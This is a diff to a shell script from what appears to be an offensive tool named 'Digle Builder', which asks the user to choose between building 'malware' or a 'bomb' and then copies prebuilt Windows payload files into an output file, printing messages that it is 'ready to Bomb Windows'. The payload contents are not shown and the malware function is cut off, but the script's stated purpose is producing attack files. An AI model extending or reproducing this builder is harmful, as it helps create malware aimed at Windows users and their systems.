@@ -1,11 +1,28 @@
 source $PODGL/lib/fsh.cfg.sh
 
+cout "Starting Digle Builder..."
+sleep 0.4
+
+if [ "$WHAT" == '' ];then
+  cerr "Cannot Build, execute 'info use' or Set ($(printf $red)Error: $(printf $white)We Don't Know what to build, Malware or Bomb? Set it with 'use bomb' or 'use malware')"
+  exit 1
+fi
 
 bomb(){
+   cout "Preparing To Build a Windows Bomb ($1)"
+   sleep 1
+   cout "Copying Bytes to $1"
+   sleep 1.5
    cp $PODGL/sys/bomb/$SYSTEM/$TARGET/a.* ./$1 &> /dev/null
    if [ "$?" != 0 ]; then
-     cerr "One Or More Option Are not valid, try again with show options and options"
+     cerr "One Or More Option Are not valid, execute show options and set all required values for building bombs"
+     exit 1
    fi
+   cout "Windows Bomb $1 Created Successfully"
+   sleep 1
+   cout "Checking Integrity of Bomb $1..."
+   sleep 0.5
+   cout "Done... $1 is now ready to Bomb Windows"
 }
 
 malware(){
